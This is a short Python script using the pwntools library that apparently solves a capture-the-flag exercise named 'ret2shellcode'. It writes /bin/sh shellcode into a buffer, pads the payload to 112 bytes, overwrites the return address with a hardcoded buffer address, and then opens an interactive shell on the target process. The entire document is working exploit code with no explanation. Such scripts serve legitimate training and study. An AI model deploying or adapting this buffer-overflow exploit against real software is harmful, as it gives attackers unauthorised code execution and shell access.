from pwn import *

context.arch = 'i386'
p = process("./ret2shellcode")

shellcode=asm(shellcraft.sh())

buf2_addr = p32(0x0804a080)
payload = shellcode+b"A"*(112-len(shellcode))+buf2_addr
print(payload)

p.recvline()

p.sendline(payload)
p.interactive()



